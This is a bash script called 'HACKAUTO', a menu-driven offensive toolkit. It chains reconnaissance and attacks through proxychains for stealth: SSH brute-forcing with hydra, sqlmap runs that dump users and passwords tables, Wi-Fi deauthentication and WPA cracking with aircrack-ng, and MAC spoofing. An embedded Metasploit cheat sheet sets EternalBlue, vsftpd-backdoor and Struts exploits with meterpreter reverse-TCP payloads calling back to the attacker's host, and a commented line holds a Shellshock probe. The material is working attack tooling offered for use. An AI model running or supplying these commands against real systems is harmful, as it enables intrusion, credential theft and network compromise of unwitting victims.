#!/bin/bash

clear
echo -e -n "\n\tInitializing ....."
sleep 1
clear
echo -e "\n\n\t\t\tHACKAUTO  v1.2\n\n"
echo -e -n "\nLog in time: "
date
echo -e -n "\nYour current IP is: "
#ifconfig |grep "netmask 255.255.255.0"
ip -o route get 1.1.1.1 | awk '{print $7}'
<< 'end'
echo -e "\nCurrent MAC ADDRESS"
ip link show| grep "link/ether"
sleep 2
echo -e "\nstopping interface..."
sleep 1
sudo ip link set dev enp0s3 down
echo -e "\nChanging MAC..."
sleep 1
sudo macchanger -m 12:34:56:78:9A:BC enp0s3
sleep 2
echo -e "\nstarting interface..."
sudo ip link set dev enp0s3 up
sleep 1
echo -e "\nTemporatry MAC ADDRESS"
ip link show enp0s3
end

nmap(){
	echo
	read -p "Enter IpAddress: " address
	echo -e "\nScanning $address...."
	sleep 2
	echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
	sudo proxychains4 nmap -sS -A -Pn $address
	echo -e "\n\nARP Scanning...."
	sudo proxychains4 nmap -n -sn -PR -Pn $address
	echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

nslookup(){
	echo
	read -p "Enter IpAddress or website(www.): " address
        echo -e "\nFetching Info..."
	sleep 2
	 echo -e "\n\nRESULT SCAN"
        echo -e "-------------------------------------------------------------------------"
        sudo proxychains4 nslookup $address
        echo -e "-------------------------------------------------------------------------"
  	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

whois(){
	echo
        read -p "Enter website url: " url
        echo -e "\nFetching url Infos..."
         sleep 2
         echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
        sudo whois  $url
        echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}


gobuster(){
	echo
	read -p "Enter website url: " url
	echo -e "\nCrusing directories..."
	 sleep 2
         echo -e "\n\nRESULT SCAN"
        echo -e "-------------------------------------------------------------------------"
	sudo gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt -k
	echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

nikto(){
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nScanning $url in Stealthy mode..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
        sudo proxychains4 nikto -h $url -evasion 1
	echo -e "---------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

niktodtvs(){
	echo -e "\nNikto directory Traversal:"
	echo -e "--------------------------"
	sleep 2
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nExploraring $url directories..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "---------------------------------------------------------------------------"
        sudo proxychains4 nikto -h $url -Plugins "lfi"
	echo -e "---------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

enum4linux(){
	echo
        read -p "Enter website url or Ipadress : " url
        echo -e "\nEnumerating $url..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
        sudo proxychains4 enum4linux -A $url
	echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

hydra(){
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nBruteforcing $url credentials..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
        sudo proxychains4 hydra -L users.txt -P rockyou.txt -t 4 ssh://$url
	echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

hashid(){
        echo -e "\nLaunching Hash-Identifier..."
        sleep 2
	echo -e "-------------------------------------------------------------------------"
        python hash-id.py
        echo -e "-------------------------------------------------------------------------"
}

wpscan(){
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nEnumerating $url users, plugins and themes..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
        sudo proxychains4 wpscan --url $url --enumerate u,vp,vt
        echo -e "-------------------------------------------------------------------------"
}


sqlmap(){
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nScanning $url in Stealthy mode..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	 echo -e "-------------------------------------------------------------------------"
	echo -e "\nScanning for Database..."
	sleep 1
#        sudo proxychains4 sqlmap -u $url --dbs 
	sudo  sqlmap -u $url --dbs 
	read -p  "Enter database name to list tables: " dbname
	echo -e "\n\nListing database tables..."
	sleep 1
	sqlmap -u $url -D $dbname --tables
	echo -e "\n\nDumping table contents..."
	sleep 1
	sqlmap -u $url -D $dbname -T users --dump
	sleep 1
	echo -e "\n\nGetting database users and privileges..."
	sleep 1
	sqlmap -u $url --users --privileges
	echo -e "\n\nExtracting usernames and passwords from users table"
	sqlmap -u $url --common-tables --common-columns
	sleep 1
	echo -e "\n\nBrute-force table/column names..."
	sqlmap -u $url -D $dbname -T users -C username,password --dump
	 echo -e "-------------------------------------------------------------------------"
	 if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}


netcat(){
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nScanning $url in Stealthy mode..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
	echo -e "\nScanning $url..."
        for port in {1..1000}; do nc -zv -w 1 $url $port 2>&1 | grep succeeded; done
	#echo -e "\nScanning $url for Vulnerabilities..."
	#sleep 2
	#echo -e "GET / HTTP/1.1\r\nHost: $url\r\nUser-Agent: () { :;}; echo \"VULNERABLE\"\r\n\r\n" | nc $url 80
	echo -e "\nTesting $url firewall outbound rule..."
        sleep 2
	nc -zv $url 80
	nc -zv $url 53
	echo -e "\nTesting $url firewall inbound rule..."
        sleep 2
        nc -zv $url 22
        echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

theHarvester(){
	echo
        read -p "Enter website url or Ipadress: " url
        echo -e "\nScanning $url..."
        sleep 2
        echo -e "\n\nRESULT SCAN"
	echo -e "-------------------------------------------------------------------------"
	python /home/administrator/theHarvester/theHarvester.py -d $url -a
	#python  theHarvester.py -d $url -all
        echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}

smbclient(){
	echo
	read -p "Enter website url or Ipadress: " url
	echo -e "\nListing all available shares..."
	echo -e "-------------------------------------------------------------------------"
	smbclient -L $url -N
	echo -e "-------------------------------------------------------------------------"
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}


<< 'end'
pkgchk() { 
    if command -v "$1" &> /dev/null; then 
        echo " Installed: $1"
    else 
        echo "Missing: $1"
	read -p "Do you want to continue with installation[y/n]? : " choice
		if [ $choice = "y" ]; then
        		# Safer: Use bash -c to avoid actually executing the command
        		bash  "$1" 2>&1 | grep -o "sudo apt install [^ ]*" | head -1
		fi
    fi
}

end

#---------------------------------------------------------------------
# Detect and install package based on distro
install_package() {
    local pkg="$1"

    if command -v apt >/dev/null 2>&1; then
        sudo apt update && sudo apt install -y "$pkg"

    elif command -v dnf >/dev/null 2>&1; then
        sudo dnf install -y "$pkg"

    elif command -v yum >/dev/null 2>&1; then
        sudo yum install -y "$pkg"

    elif command -v pacman >/dev/null 2>&1; then
        sudo pacman -Sy --noconfirm "$pkg"

    elif command -v zypper >/dev/null 2>&1; then
        sudo zypper install -y "$pkg"

    elif command -v apk >/dev/null 2>&1; then
        sudo apk add "$pkg"

    else
        echo " Unsupported Linux distribution."
        return 1
    fi
}

# Check if a command exists, otherwise offer to install
package_check() {
    local cmd="$1"
    local pkg="$2"

    # Validate arguments
    if [[ -z "$cmd" || -z "$pkg" ]]; then
        echo " Usage: package_check <command> <package>"
        return 1
    fi

    # Check if command exists
    if command -v "$cmd" >/dev/null 2>&1; then
        echo " '$cmd' is already installed."
        return 0
    fi

    echo " '$cmd' command not found."
    echo " Required package: $pkg"
    read -rp "Install '$pkg'? (y/n): " choice

    case "$choice" in
        y|Y)
            install_package "$pkg"
            ;;
        *)
            echo "Skipped installation of '$pkg'"
            ;;
    esac
}

#---------------------------------------------------------------------


air-crack-ng(){
        echo -e "\nLaunching Air-crack-ng..."
	sleep 1
	echo -e "Your interface is: "
	ifconfig | grep "BROADCAST"
	sleep 1
	echo -e "\nChecking for available networks..."
	sudo airmon-ng
	sleep 1
	echo -e -n "\nEnter the interface label(name): "
	read interface
	sudo airmon-ng start $interface
	sleep 1
	echo -e "\nChecking monitor mode...\nThe new interface new should end with (mon)..."
	sudo airmon-ng
	sleep 1
	echo -e -n "\nEnter the new interface to stop monitoring(ends with [..mon]): "
	read inter
	sudo airmon-ng stop $inter
	echo -e "Stopping..."
	sleep 2
	echo -e "\nScanning for networks..."
	sudo airodump-ng $inter
	echo -e -n "Enter channel number to scan: "
	read channel
	echo -e -n "Enter bssid: "
	read bssid
	echo -e "\nScanning $channel..."
	sudo airodump-ng $inter --channel $channel
	sleep 1
	echo -e "\nScanning bssid $bssid with channel $channel..."
	sudo airodump-ng $inter --bssid $bssid --channel $channel
	sleep 1
	echo -e "\nCapturing  Handshake..."
	sudo airodump-ng $inter --bssid $bssid --channel $channel --write capture
	sleep 1
	echo -e "\nDeauthentication attack.."
	sudo aireplay-ng $inter --deauth 10  $bssid
	sleep 1
	echo -e "\nCracking WPA/WPA2 Handshake..."
	sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
	sleep 2

}

#APPEND

append() {
    echo -e "\nEnter text to add (end with an empty line): "
    new_lines=""

    # Read multi-line input
    while IFS= read -r line; do
        [[ -z "$line" ]] && break
        new_lines+="$line"$'\n'
    done

    # Insert user lines at #APPEND and add a new #APPEND marker
    awk -v insert="$new_lines" '
    { 
        if($0=="#APPEND"){
            printf "%s", insert   # Insert user lines
            print "#APPEND"       # Add the marker back
            next
        } 
        print
    }' hackauto.sh > hackauto.tmp && mv hackauto.tmp hackauto.sh

    echo "Lines added successfully..."
}

save(){
	echo -e "\nSaving changes..."
	sleep 2
	cp hackauto.sh hackauto2.sh
}

custom(){
	echo
	read -p "Enter your command: " cmd
	sleep 1
	$cmd 2>/dev/null
	error_output=$($cmd 2>&1)
	if [ $? -ne 0 ]; then
                echo -e "\nError occured!\n"
                sleep 1
		clean_error=$(echo "$error_output" | awk '{sub(/^[^:]+: line [0-9]+: /, ""); print}')
		echo "Clean error: $clean_error"
		package_check
        fi
}

rerun(){
	echo -e "Rerunning script..."
	sleep 1
	bash hackauto.sh
}

redefine_function() {
    script_file="${BASH_SOURCE[0]}"

    echo -e "\nAvailable functions:"
    declare -F | awk '{print NR") "$3}'
    echo

    read -rp "Enter the function name to redefine: " func_name
	type "$func_name"
    if ! declare -f "$func_name" >/dev/null; then
        echo "Function '$func_name' does not exist."
        return 1
    fi

    echo "Enter new body for $func_name (end with an empty line): "
    new_body=""

    while IFS= read -r line; do
        [[ -z "$line" ]] && break
        new_body+="$line"$'\n'
    done

    # Create the new definition
    new_def="function ${func_name}() {
${new_body}
}"

    # Backup original file
    cp "$script_file" "${script_file}.bak"

    # Replace old definition with new one
    awk -v f="$func_name" -v n="$new_def" '
        $0 ~ "^function "f"\\(\\)" {in_func=1; print n; next}
        in_func && /^\}/ {in_func=0; next}
        !in_func
    ' "$script_file" > "${script_file}.tmp" && mv "${script_file}.tmp" "$script_file"

    echo "Function '$func_name' permanently updated in $script_file"

echo -e "\nDeleting '${script_file}.bak' "
sleep 2
rm -r "${script_file}.bak"
  	if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi

}


delete_function() {
      echo -e "\nAvailable functions:"
          declare -F | awk '{print NR") "$3}'
          echo

    read -p "Enter the function name to delete: " func_name

    # Check if function exists in the script
    if ! grep -qE "^[[:space:]]*(function[[:space:]]+)?${func_name}[[:space:]]*\(\)" hackauto.sh; then
        echo "Function '$func_name' not found in hackauto.sh."
        return 1
    fi

    # Use awk to remove the entire function block
    awk -v fn="$func_name" '
    BEGIN { in_func=0 }
    {
        # Detect function start (with or without "function" keyword)
        if ($0 ~ "^[[:space:]]*(function[[:space:]]+)?" fn "[[:space:]]*\\(\\)[[:space:]]*{") {
            in_func=1
            next
        }
        # Detect end of function
        if (infunc && $0 ~ /^[[:space:]]*}/) {
            in_func=0
            next
        }
        # Print lines outside the target function
        if (!in_func)
            print
    }' hackauto.sh > hackauto.tmp && mv hackauto.tmp hackauto.sh

    echo "Function '$func_name' deleted successfully."
	 if [ $? -ne 0 ]; then
                echo -e "\nError occured!"
                sleep 1
        fi
}


scan_tools(){
	echo -e "\nScanning system for Hacking tools..."
	echo "------------------------------------"
	sleep 2
	# List of commonly known security tools
	TOOLS=(
	    nmap
	    hydra
	    sqlmap
	    metasploit
	    msfconsole
	    nikto
	    john
	    aircrack-ng
	    tcpdump
	    wireshark
	    netcat
	    nc
	    hping3
	    gobuster
	    kismet
	    dirb
	    shodan
	    wfuzz
	    enum4linux
	    hashcat
	    zap
	)

FOUND=0

for tool in "${TOOLS[@]}"; do
    if command -v "$tool" >/dev/null 2>&1; then
        path=$(command -v "$tool")
        echo -e "\e[1;32mFOUND:\e[0m $tool  →  $path"
        ((FOUND++))
    else
        echo -e "\e[1;31mNOT FOUND:\e[0m $tool"
    fi
    sleep 1
done

echo "------------------------------------------------------------"
echo "Scan complete."

if [ "$FOUND" -gt 0 ]; then
    echo "$FOUND security-related tool(s) detected."
else
    echo "No common security tools detected."
fi
echo "------------------------------------------------------------"
}

metasploit(){
	echo -e "\nLauching Metasploit-framework Guidelines...\n"
	sleep 2
	echo -e "
	Basic scanning Try the commands below...
	----------------------------------------
	use auxiliary/scanner/portscan/tcp
	set RHOSTS [remote/victim's ipaddress] 192,168....
	set PORTS  [ports] eg: 1-1000 or  22,80,143
	run \n

	For SMB enumeration
	-------------------
	use auxiliary/scanner/smb/smb_version
	set RHOSTS [remote/victim's ipaddress]
	run \n

	SSH version detection
	---------------------
	use auxiliary/scanner/ssh/ssh_version
	set RHOSTS [remote/victim's ipaddress]
	run \n

	HTTP service scan
	-----------------
	use auxiliary/scanner/http/http_version
	set RHOSTS [remote/victim's ipaddess]
	run \n

	SMB vulnerabilities
	-------------------
	use auxiliary/scanner/smb/smb_ms17_010
	set RHOSTS [remote/victim's ipaddress]
	run\n

	HTTP vulnerability scanning
	---------------------------
	use auxiliary/scanner/http/dir_scanner
	set RHOSTS [remote/victim's ipaddress]
	set THREADS 10
	run\n

	Search for exploits
	-------------------
	search eternalblue


	Search by type
	--------------
	search type:exploit platform:windows


	Search by CVE
	-------------
	search cve:2017-0144


	Select exploit
	--------------
	use exploit/windows/smb/ms17_010_eternalblue


	Show options
	------------
	show options


	Set required parameters
	-----------------------
	set RHOSTS [remote/victim's ipaddress]
	set LHOST 192.168.1.50 [your ipaddress]
	set LPORT 4444


	Set payload
	-----------
	set PAYLOAD windows/x64/meterpreter/reverse_tcp


	Launch exploit
	--------------
	exploit


	Web application exploit
	-----------------------
	use exploit/multi/http/struts2_rest_xstream
	set RHOSTS [remote/victim's ipaddress]
	set TARGETURI /orders
	set LHOST 192.168.1.50 [your ipaddress]
	exploit


	FTP exploit
	-----------
	use exploit/unix/ftp/vsftpd_234_backdoor
	set RHOSTS [remote/victim's address]
	exploit


	Using Meterpreter
	-----------------
	use exploit/windows/smb/ms17_010_eternalblue
	set RHOSTS [victim's ipaddress]
	set PAYLOAD windows/x64/meterpreter/reverse_tcp
	set LHOST [your ipaddress]    # Your machine IP
	set LPORT 4444
	exploit


	Using Meterpreter to Exploit FTP Service
	-----------------------------------------
	msfconsole
	use exploit/unix/ftp/vsftpd_234_backdoor
	set RHOSTS [victim's ipaddress]
	set PAYLOAD linux/x86/meterpreter/reverse_tcp
	set LHOST [your ipaddress]
	set LPORT 4444
	exploit


	Using Meterpreter to Exploit SSH
	---------------------------------
	msfconsole
	use auxiliary/scanner/ssh/ssh_login
	set RHOSTS 192.168.1.100
	set USERNAME root
	set PASSWORD password123
	set PAYLOAD linux/x86/meterpreter/reverse_tcp
	set LHOST 192.168.1.50
	exploit


	"
	sleep 2
	sudo msfconsole

}



master(){

while true; do
echo -e "\n\n\nAVAILABLE TOOLS:\n----------------\
\n1:nslookup		6:netcat\n2:whois			7:theHarvester\n3:nmap			8:sqlmap\n4:gobuster		9:wpscan\n5:air-crack-ng		10:hash-id \
\n\n11:hydra		16:save\n12:enum4linux		17:edit\n13:nikto		18:append\n14:niktodtvs		19:delete\n15:smbclient		20:custom command \
\n\n21:Hacking tool Detector\n22:rerun\n23:close\nm:metasploit"
echo
read -p "Select tool to use: " tool
	case  $tool in
		1)nslookup;;
		2)whois;;
		3)nmap;;
		4)gobuster;;
		5)air-crack-ng;;
		6)netcat;;
		7)theHarvester;;
		8)sqlmap;;
		9)wpscan;;
		10)hashid;;
		11)hydra;;
		12)enum4linux;;
		13)nikto;;
		14)niktodtvs;;
		15)smbclient;;
		16)save;;
		17)redefine_function;;
		18)append;;
		19)delete_function;;
		20)custom;;
		21)scan_tools;;
		22)rerun;;
		23)echo -e "\nClosing script..."
		sleep 1
		     clear
		     exit;;
		m) metasploit;;
		*) echo "Option not found" ;;

	esac

done
}

master
